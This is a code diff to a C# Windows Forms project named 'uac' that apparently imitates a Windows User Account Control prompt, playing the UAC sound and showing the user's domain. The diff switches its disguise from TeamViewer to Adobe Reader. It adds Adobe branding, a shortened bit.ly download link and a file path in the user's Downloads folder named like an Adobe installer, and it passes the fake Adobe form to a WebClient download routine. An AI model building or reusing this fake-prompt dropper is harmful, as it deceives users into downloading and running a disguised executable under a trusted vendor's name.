@@ -20,8 +20,8 @@ namespace uac
         private static string test;
         private static string currentUserName = Environment.UserName;
         private static string currentDomain = Environment.UserDomainName;
-        private static string fileUrl = "https://bit.ly/40dN90f";
-        private static string fileName = @"C:\Users\" + currentUserName + @"\Downloads\TeamViewer_Setup_x64.exe";
+        private static string fileUrl = "https://bit.ly/3LCt52L";
+        private static string fileName = @"C:\Users\" + currentUserName + @"\Downloads\readerdc64_en_l_cra_mdr_install.exe";
 
         public Form1()
         {
@@ -31,7 +31,9 @@ namespace uac
             SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows User Account Control.wav");
             sound.Play();
             this.label4.Text = currentDomain;
-            this.Icon = Properties.Resources.TeamViewer_Logo_Icon_Only;
+            this.Icon = Properties.Resources.alogo;
+            this.pictureBox1.Image = Properties.Resources.a;
+            this.button3.BringToFront();
 
         }
 
@@ -108,7 +110,7 @@ namespace uac
 
             //Thread.Sleep(3000);
             this.Hide();
-            Teamviewer pgBar = new Teamviewer();
+            Adobe pgBar = new Adobe();
             
             pgBar.Show();
             pgBar.BringToFront();
@@ -116,7 +118,7 @@ namespace uac
             
         }
 
-        public void downloadExe(Teamviewer pgBar)
+        public void downloadExe(Adobe pgBar)
         {
             using (WebClient client = new WebClient())
             {
